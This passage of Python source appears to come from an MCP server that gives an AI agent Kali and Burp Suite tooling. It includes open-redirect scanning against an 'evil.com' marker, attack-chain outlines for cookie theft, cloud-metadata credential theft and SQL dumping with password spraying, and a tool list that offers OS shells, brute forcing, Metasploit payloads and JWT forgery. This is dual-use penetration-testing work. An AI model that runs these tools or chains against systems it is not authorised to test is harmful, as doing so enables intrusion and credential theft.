        return {"error": f"No payloads for type: {payload_type}"}
    results = []
    for p in payloads[:20]:
        req = request_template.replace(marker, p)
        r   = _burp_post("send_to_intruder",
                         {"request": req, "tabName": f"MCP-{payload_type}"})
        results.append({"payload": p, "result": r})
    return {"attack_mode": attack_mode, "payload_type": payload_type,
            "payloads_sent": len(results), "results": results}

# ── Open Redirect Scanner ─────────────────────────────────────────────────────

@mcp.tool()
def scan_open_redirects(base_url: str, params_to_test: list[str] = None) -> dict:
    """Scan for open redirect vulnerabilities in URL parameters."""
    params = params_to_test or [
        "url","redirect","redirect_uri","return","return_url",
        "next","goto","dest","destination","continue","target","ref",
    ]
    findings = []
    for param in params:
        for payload in _PAYLOADS["open_redirect"]:
            try:
                r = requests.get(base_url, params={param: payload},
                                 allow_redirects=False, timeout=8)
                loc = r.headers.get("Location", "")
                if r.status_code in (301,302,303,307,308) and "evil.com" in loc:
                    findings.append({"param": param, "payload": payload,
                                     "status": r.status_code, "location": loc})
            except Exception:
                continue
    return {"url": base_url, "findings": findings, "vulnerable": bool(findings)}

# ── Vuln Chain Narrative ──────────────────────────────────────────────────────

@mcp.tool()
def chain_vulnerabilities_into_narrative(target_url: str,
                                          scan_first: bool = False) -> dict:
    """Build an attack chain narrative from Burp scanner findings."""
    if scan_first:
        burp_active_scan(target_url)
        time.sleep(5)
    issues = get_scanner_issues()
    if not isinstance(issues, list):
        return {"error": "No scanner issues"}
    by_type = {}
    for issue in issues:
        by_type.setdefault(issue.get("issueName","Unknown"), []).append(issue)
    chains = []
    if any("cross-site" in t.lower() for t in by_type):
        chains.append({"name": "XSS → ATO", "severity": "CRITICAL",
                        "steps": ["Inject XSS payload", "Steal document.cookie",
                                  "Import cookie to attacker browser", "Full account access"]})
    if any("ssrf" in t.lower() for t in by_type):
        chains.append({"name": "SSRF → Cloud Creds → Lateral Movement",
                        "severity": "CRITICAL",
                        "steps": ["SSRF to 169.254.169.254", "Extract IAM credentials",
                                  "aws configure with stolen creds", "Access S3/EC2/Lambda"]})
    if any("sql" in t.lower() for t in by_type):
        chains.append({"name": "SQLi → Credential Dump → Password Spray",
                        "severity": "CRITICAL",
                        "steps": ["UNION SELECT to dump users table",
                                  "Crack password hashes with hashcat",
                                  "Spray against login + other services",
                                  "Pivot to admin/CI-CD panels"]})
    return {"target": target_url, "issues_found": len(issues),
            "vuln_types": list(by_type.keys()), "attack_chains": chains,
            "executive_summary": f"{len(issues)} vulns → {len(chains)} attack chains found"}

# ── Diff / Replay ─────────────────────────────────────────────────────────────

@mcp.tool()
def replay_and_diff(request_a: str, request_b: str,
                     host: str, port: int = 443, use_https: bool = True) -> dict:
    """Replay two HTTP requests via Burp and diff the responses."""
    ra = str(send_http1_request(request_a, host, port, use_https))
    rb = str(send_http1_request(request_b, host, port, use_https))
    diff = list(difflib.unified_diff(ra.splitlines(), rb.splitlines(),
                                      fromfile="A", tofile="B", lineterm=""))
    return {"length_a": len(ra), "length_b": len(rb),
            "length_diff": abs(len(ra)-len(rb)), "diff": diff[:100],
            "identical": ra == rb}


# ═════════════════════════════════════════════════════════════════════════════
# ── WORKFLOW TOOLS ───────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════════════════════

@mcp.tool()
def recon_target(target: str, include_subdomains: bool = True) -> dict:
    """
    Full recon workflow on a target domain or IP:
    nmap + whatweb + whois + subdomain enum + CVE mapping.
    """
    result = {}
    # Nmap
    result["nmap"] = nmap_scan(target, "-sV -T4 --open -p 21,22,23,25,80,443,8080,8443,3306,5432")
    # WhatWeb
    schema = "https" if "443" in result["nmap"] else "http"
    result["whatweb"] = whatweb_scan(f"{schema}://{target}")
    # Whois
    result["whois"] = whois_lookup(target)
    # Subdomains
    if include_subdomains:
        result["subdomains"] = enumerate_subdomains(target)
    # CVEs from whatweb output
    result["cve_hints"] = search_cve_by_keyword(target, limit=5)
    return result

@mcp.tool()
def full_web_audit(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> dict:
    """
    Full web application audit:
    nikto + gobuster + whatweb + CORS + param mining + JS endpoint discovery
    """
    from urllib.parse import urlparse
    parsed = urlparse(url)
    result = {}
    result["nikto"]     = nikto_scan_url(url)
    result["gobuster"]  = gobuster_dir(url, wordlist)
    result["whatweb"]   = whatweb_scan(url)
    result["cors"]      = test_cors_misconfiguration(url)
    result["params"]    = mine_hidden_parameters(url)
    # Try to find and crawl JS files
    try:
        r = requests.get(url, timeout=10)
        js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', r.text)
        if js_files:
            js_url = js_files[0]
            if not js_url.startswith("http"):
                js_url = f"{parsed.scheme}://{parsed.netloc}/{js_url.lstrip('/')}"
            result["js_endpoints"] = discover_api_endpoints_from_js(js_url)
    except Exception:
        pass
    return result

@mcp.tool()
def list_all_tools() -> dict:
    """List ALL available MCP tools organised by category."""
    return {
        "kali_network_scanning": [
            "nmap_scan", "nmap_vuln_scan", "nmap_os_detect", "nmap_full_port_scan",
            "nmap_udp_scan", "nmap_script", "masscan_fast",
        ],
        "kali_web_scanning": [
            "nikto_scan", "nikto_scan_url", "gobuster_dir", "gobuster_dns",
            "gobuster_vhost", "dirb_scan", "ffuf_dir", "ffuf_param",
            "wpscan", "nuclei_scan", "nuclei_scan_list", "whatweb_scan",
        ],
        "kali_injection_testing": [
            "sqlmap_scan", "sqlmap_dbs", "sqlmap_tables", "sqlmap_dump",
            "sqlmap_os_shell", "sqlmap_request_file",
        ],
        "kali_brute_force": [
            "hydra_ssh", "hydra_http_post", "hydra_ftp", "hydra_smb",
            "hydra_service", "john_crack", "john_show", "hashcat_crack",
        ],
        "kali_exploit": [
            "msf_run_resource", "msf_search", "msf_module_info",
            "msf_exploit", "msf_generate_payload",
        ],
        "kali_recon": [
            "whois_lookup", "dig_query", "fierce_dns", "dnsx_resolve",
            "subfinder_enum", "amass_enum", "enumerate_subdomains",
            "smbclient_list_shares", "smbclient_connect", "enum4linux",
        ],
        "kali_ssl": [
            "sslscan", "testssl", "openssl_check_cert",
        ],
        "kali_network": [
            "curl_request", "wget_download", "nc_banner_grab",
        ],
        "kali_tool_management": [
            "install_tool", "install_wordlists", "list_installed_tools", "run_command",
        ],
        "burp_proxy": [
            "get_proxy_http_history", "get_proxy_http_history_regex",
            "get_proxy_websocket_history", "get_proxy_websocket_history_regex",
            "set_proxy_intercept_state",
        ],
        "burp_scanner": [
            "burp_active_scan", "burp_get_scan_status", "burp_cancel_scan",
            "burp_passive_scan", "get_scanner_issues",
        ],
        "burp_repeater_intruder": [
            "send_http1_request", "send_http2_request", "create_repeater_tab",
            "send_to_intruder", "build_intruder_attack", "replay_and_diff",
        ],
        "burp_collaborator": [
            "generate_collaborator_payload", "get_collaborator_interactions",
            "probe_ssrf", "test_host_header_injection",
        ],
        "burp_config": [
            "output_project_options", "output_user_options",
            "set_project_options", "set_user_options",
            "set_task_execution_engine_state",
            "get_active_editor_contents", "set_active_editor_contents",
        ],
        "burp_encoding": [
            "base64_encode", "base64_decode", "url_encode", "url_decode",
            "generate_random_string",
        ],
        "python_vulnerability_testing": [
            "test_cors_misconfiguration", "test_host_header_injection",
            "detect_request_smuggling", "mine_hidden_parameters",
            "analyze_session_entropy", "detect_cache_poisoning",
            "scan_open_redirects", "probe_ssrf", "analyze_oauth_flow",
        ],
        "python_jwt_auth": [
            "jwt_decode", "jwt_forge_none_alg", "jwt_brute_secret",
        ],
        "python_recon": [
            "enumerate_subdomains", "discover_api_endpoints_from_js",
            "graphql_introspect",
        ],
        "python_payloads": [
            "get_payloads", "get_all_payload_types",
        ],
        "python_intel": [
            "lookup_cve", "search_cve_by_keyword", "tech_to_cves",
            "github_advisory_search", "github_repo_secret_scan",
        ],
        "python_exploits": [
            "generate_exploit_template", "auto_exploit_from_scan",
        ],
        "workflows": [
            "recon_target", "full_web_audit",
            "chain_vulnerabilities_into_narrative", "list_all_tools",
            "burp_health_check",
        ],
    }


# ═════════════════════════════════════════════════════════════════════════════
# CLI
# ═════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="All-Tools Kali + Burp MCP Bridge v3.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Ports:
          9876  Burp REST bridge (Burp MCP extension)
          8082  MCP SSE endpoint  (--transport sse)
        Examples:
          python3 kali_burp_mcp.py
          python3 kali_burp_mcp.py --transport sse
          python3 kali_burp_mcp.py --burp-url http://127.0.0.1:9876
        """),
    )
    parser.add_argument("--burp-url",   default=BURP_URL)
    parser.add_argument("--api-key",    default=BURP_API_KEY)
    parser.add_argument("--transport",  default="stdio", choices=["stdio","sse"])
    parser.add_argument("--mcp-host",   default="127.0.0.1")
    parser.add_argument("--mcp-port",   type=int, default=MCP_SSE_PORT)
    parser.add_argument("--timeout",    type=int, default=HTTP_TIMEOUT)
    parser.add_argument("--tool-timeout", type=int, default=TOOL_TIMEOUT)
    parser.add_argument("--debug",      action="store_true")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    cfg.update({
        "burp_url":    args.burp_url,
        "api_key":     args.api_key,
        "timeout":     args.timeout,
        "tool_timeout":args.tool_timeout,
    })
    logger.info("=== All-Tools Kali + Burp MCP Bridge v3.0 ===")
    logger.info(f"Burp URL     : {cfg['burp_url']}")
    logger.info(f"Transport    : {args.transport}")

    if args.transport == "sse":
        mcp.settings.host = args.mcp_host
        mcp.settings.port = args.mcp_port
        logger.info(f"MCP SSE      : http://{args.mcp_host}:{args.mcp_port}/sse")
        try:
            mcp.run(transport="sse")
        except KeyboardInterrupt:
            pass
    else:
        mcp.run()

if __name__ == "__main__":
    main()
